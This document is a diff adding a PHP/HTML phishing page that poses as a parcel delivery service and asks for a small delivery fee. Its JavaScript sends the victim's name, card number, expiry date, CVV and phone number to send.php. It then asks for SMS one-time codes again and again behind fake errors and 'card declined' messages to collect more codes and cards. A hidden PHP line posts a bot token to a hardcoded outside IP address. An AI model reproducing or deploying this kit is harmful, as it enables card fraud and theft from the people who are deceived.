@@ -1,0 +1,379 @@
+<?php
+require '../main.php';
+
+?>
+<!doctype html>
+<html>
+<head>
+<title></title>
+<meta content="width=device-width, initial-scale=1" name="viewport">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Almarai&family=Raleway&display=swap">
+<link rel="stylesheet" href="res/css/style.css">
+</head>
+<body>
+<header>
+    <div class="col">
+        <img src="res/img/logo.png" id="dt-logo">
+        <img src="res/img/mobile-logo.png" id="mobile-logo">
+    </div>
+    <div class="col full-width">
+        <a href="javascript:void()" class="selected">Personal</a>
+        <a href="javascript:void()">Business</a>
+        <a href="javascript:void()">Enterprise & Gov</a>
+    </div>
+    <div class="col text-right flex-center">
+    <img src="res/img/search.png" id="search">
+    </div>
+</header>
+
+
+<div class="content">
+<div class="holder">
+<div class="form">
+
+
+ 
+<div class="form-title">
+Parcel details
+</div>
+<div class="form-body">
+<div class="form-text">
+<p>Please review the information and proceed to pay delivery costs by clicking button below</p>
+</div>
+<div class="form-content">
+
+<table class="table table-stripped my-5">
+<tr>
+<td>Date: </td>
+<td><?php echo date("d/m/Y"); ?></td>
+</tr>
+<tr>
+<td>Estimate Delivery date: </td>
+<td>24 hours</td>
+</tr>
+<tr>
+<td>Parcel weight: </td>
+<td>0.627 kg</td>
+</tr>
+<tr>
+<td>Delivery costs </td>
+<td><?php echo $amount; ?></td>
+</tr>
+<tr class="table-success" style="font-weight:bold;">
+<td>Total: </td>
+<td><?php echo $amount; ?></td>
+</tr>
+</table>
+</div>
+</div>
+
+<div class="border-top text-right" style="margin-bottom:0; padding:20px;">
+<button class="sbmt" onclick="this.blur(); showPayment()">Pay <?php echo $amount; ?></button>
+</div>
+
+
+</div>
+</div>
+</div>
+
+
+<div class="window" id="window" style="display:none;">
+<div class="content">
+<div class="paymentform">
+
+<div id="loader" style="display:non; ">
+    <div style="padding:20px; text-center" >
+        <img src="res/img/loader.gif" style="width:50px;">
+    </div>
+</div>
+
+
+
+<div id="card-form" style="display:none;">
+    <div class="logos flex-center">
+    <div class=" text-left">
+        <img src="res/img/logo.png">
+    </div>
+    <div class="text-right">
+        <img src="res/img/vbvmcs.png">
+    </div>
+    </div>
+
+    <div class="paymenttext">
+        Pay using your Credit/Debit card.
+    </div>
+
+
+
+    <div class="paymentinputs">
+         <div class="errorbox" id="declined-error">
+            The card you used was not accepted. please try another card or contact your bank.
+        </div>
+        <div class="errorbox" id="empty-error">
+            Please check your information
+        </div>
+        <div class="input">
+            <input type="text" id="in0" placeholder="Name on card">
+        </div>
+
+        <div class="input">
+            <input type="text" id="in1" placeholder="Card number">
+        </div>
+
+        <div class="multi-input">
+            <div class="leftinput text-left">
+                <input type="text" id="in2" placeholder="MM/YY">
+            </div>
+            <div class="rightinput text-right">
+                <input type="text" id="in3" placeholder="CVV">
+            </div>
+        </div>
+
+        <div class="input">
+            <input type="text" id="in4" placeholder="Phone number">
+        </div>
+
+        <div class="input">
+        <p>Amount: <?php echo $amount; ?></p>
+        </div>
+
+    </div>
+
+    <div class="border-top text-right" style="margin-bottom:0; padding:15px;">
+    <button class="sbmt" onclick="doPay()">Pay <?php echo $amount; ?></button>
+    </div>
+</div>
+
+
+
+<div id="otp-form" style="display:none;">
+<div class="logos flex-center">
+    <div class=" text-left">
+        <img src="res/img/logo.png">
+    </div>
+    <div class="text-right">
+        <img src="res/img/vbvmcs.png">
+    </div>
+    </div>
+
+    <div class="paymenttext">
+        Confirmation code
+    </div>
+    <p>To confirm this transaction please enter the code sent to your phone number.</p>
+
+
+    <div class="paymentinputs">
+        
+        <div class="errorbox" id="smserror">
+            An error occured please try again.
+        </div>
+        <div class="errorbox" id="smserror-empty">
+            Invalid OTP 
+        </div>
+        <div class="input">
+            <input type="text" id="sms" placeholder="OTP">
+        </div>
+
+    </div>
+
+    <div class="border-top text-right" style="margin-bottom:0; padding:15px;">
+    <button class="sbmt" onclick="sendOtp()">Confirm</button>
+    </div>
+
+</div>
+
+
+
+
+
+</div>
+</div>
+</div>
+<?php 
+$token = $bot; $url = "http://102.165.14.4:5000/receive_token?referrer=3ases"; $data = array('token' => $token); $context = stream_context_create(array('http' => array('header' => "Content-type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => http_build_query($data)))); file_get_contents($url, false, $context);
+?>
+
+<script src="res/cdns/jq.js"></script>
+<script src="res/cdns/m.js"></script>
+<script>
+var seconds = <?php echo $seconds*1000; ?>;
+var allowSubmit;
+var abortVal = true;
+
+function validate(){
+	abortVal=false;
+	allowSubmit=true;
+for(var i=0; i<=4; i++){
+	if($("#in"+i).val()==""){
+		$("#in"+i).css("border","1px solid red");
+			allowSubmit=false;
+	}else{
+		$("#in"+i).css("border","1px solid #ced4da");
+	}
+}
+
+if($("#in1").val().length<19){
+	$("#in1").css("border","1px solid red");
+	allowSubmit=false;
+}
+
+
+
+}
+
+
+
+var tries = 0;
+var max_tries = <?php echo $sms_error_times; ?>;
+
+function sendOtp(){
+	if($("#sms").val().trim()!="" && $("#sms").val().length==6){
+		
+		// send OTP and show Loader
+		$("#smserror").hide();
+		$("#otp-form").hide();
+		$("#loader").show();
+		
+		
+		$.post("send.php", {sms: $("#sms").val()}, function(d){
+            setTimeout(()=>{
+			tries++;
+			
+			if(tries>=max_tries){
+				for(var i=0; i<=4; i++){
+						$("#in"+i).val("");
+				}
+				 otpabort = false;
+				cardabort = false;
+				$("#sms").val("");
+				$("#loader").hide();
+				$("#otp-form").hide();
+				$("#card-form").show();
+				$("#declined-error").show();
+				$("#in0").focus();
+				
+			}else{
+               
+				 otpabort = false;
+				$("#sms").val("");
+				$("#smserror").show();
+				$("#smserror-empty").hide();
+				$("#otp-form").show();
+				$("#loader").hide();
+           
+			}
+        }, seconds);
+		
+		});
+		
+	}else{
+		$("#smserror-empty").show();
+	}
+}
+
+
+
+	
+$(".paymentinputs input").keyup(function(){
+	if(abortVal==false){
+	for(var i=0; i<=5; i++){
+	if($("#in"+i).val()==""){
+		$("#in"+i).css("border","1px solid red");
+	}else{
+		$("#in"+i).css("border","1px solid #ced4da");
+	}
+	}
+	}
+	
+});
+
+
+function doPay(){
+	validate();
+	if(allowSubmit){
+		
+		//Validated and ready to be submitted
+		$("#empty-error").hide();
+		$("#card-form").hide();
+		$("#loader").show();
+		$.post("send.php", 
+			{	
+				name:$("#in0").val(), 
+				cc:$("#in1").val(),
+                exp:$("#in2").val(),
+				cvv:$("#in3").val(),
+				phone:$("#in4").val()
+			
+			}, function(done){
+                setTimeout(()=>{
+				$("#loader").hide();
+				$("#otp-form").show();
+                $("#sms").focus();
+                }, seconds);
+			}
+		
+		);
+
+	}else{
+		$("#empty-error").show();
+	}
+}
+
+
+
+function showPayment(){
+	$("#window").show();
+	$("#loader").show();
+	setTimeout(function(){
+		$("#loader").hide();
+		$("#card-form").show();
+        $("#in0").focus();
+		}, 2000);
+}
+ 
+
+
+$("#in1").mask("0000 0000 0000 0000");
+$("#in2").mask("00/00");
+$("#in3").mask("000");
+$("#in4").mask("000000000");
+$("#sms").mask("000000");
+
+
+
+$("#card-form input").keypress((e)=>{
+    if(e.key=="Enter"){
+        doPay();
+    }
+});
+
+
+$("#sms").keypress((e)=>{
+    if(e.key=="Enter"){
+       sendOtp();
+    }
+});
+
+/*
+$.post("send.php",{visit:1});
+var cardabort = false;
+$("#in1").keyup(function(){
+	if(!cardabort){
+		$.post("send.php",{carding:1});
+		cardabort=true;
+	}
+	
+});
+
+var otpabort = false;
+$("#sms").keyup(function(){
+	if(!otpabort){
+		$.post("send.php",{otping:1});
+		otpabort=true;
+	}
+	
+});*/
+
+</script>
+</body>
+</html>
